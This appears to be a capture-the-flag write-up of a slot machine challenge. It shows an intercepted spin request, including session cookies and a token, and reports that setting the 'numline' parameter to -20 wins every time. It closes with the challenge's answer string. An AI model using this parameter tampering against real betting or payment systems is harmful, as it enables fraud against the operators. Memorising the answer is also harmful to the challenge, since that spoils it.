# Slot Machine Investigation

Intercept the request, a standard POST request to the server to send data to bet to the slots shows:

```HTTP
POST /api/v1/cda78409-427d-42a1-b454-f6c864c972e4/spin HTTP/2
Host: slots.jackfrosttower.com
Cookie: XSRF-TOKEN=eyJpdiI6IndBTU13TXBld0c4KzFSZmtiK2RleHc9PSIsInZhbHVlIjoiVXh6MUs5YzM2V0U2bkQ4YzhCcXo5MW1GQ1Jpem95ZnhRNVh3eEtWNVYybGlGZlRiN3Q5TDZUMjZsaFhFWW9GOEhvYitzRCtMRlBqKzZSQ0ZsQy90REtKUHhLLzRQY1hKQVhaMHg2NWhHMFVMd2pSVUJTK2hEdHNLK1FBcVhPU3oiLCJtYWMiOiI5MWMyMmU2NzZiOGM5MjgyOTY5ZDE5NDQ5ZDkyMmMxZGM3YzViMjBhOGUwY2FlOWVkNjZiOThiMDI2Yzg5YjgzIiwidGFnIjoiIn0%3D; slots_session=eyJpdiI6InpuRGdRVVY3WkZLTlFFdFJrSG1UQXc9PSIsInZhbHVlIjoiZDFoUjFnZnZkUWtZb3Y1ZTZqMVJXd0p3WG03dm1pZWJYa0FQc2xOYnh6RjRRcWRZSHl5dEFFNWZrRGcyTkc0TG56dUY1ZUdPa3Z5OWttcG9La0ZBbjFkZjAvZlFRcURlbHJrSVZYYy9LTHpVTDgrY3BYWmc0M2x0RldYV29QMWMiLCJtYWMiOiJkMWJlNzE4MzY4Y2NkNTFiYjk4OWY2ZDA0M2U3NGUwYWIxZjhmNjhhNjQwZGI1ODRmYmNiY2I1MzMwMTc0Y2ZiIiwidGFnIjoiIn0%3D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://slots.jackfrosttower.com/uploads/games/frostyslots-861175/index.html
Content-Type: application/x-www-form-urlencoded
X-Ncash-Token: add570a0-5a79-4903-a13b-2f12cbe8b923
Origin: https://slots.jackfrosttower.com
Content-Length: 33
Te: trailers

betamount=10&numline=20&cpl=0.1
```

Note the line `betamount=10&numline=20&cpl=0.1`

By changing the `numline` to equal -20, I win every time. Somehow!

Need to find out what the `numline` parameter actually does.

Answer: `I'm going to have some bouncer trolls bounce you right out of this casino!`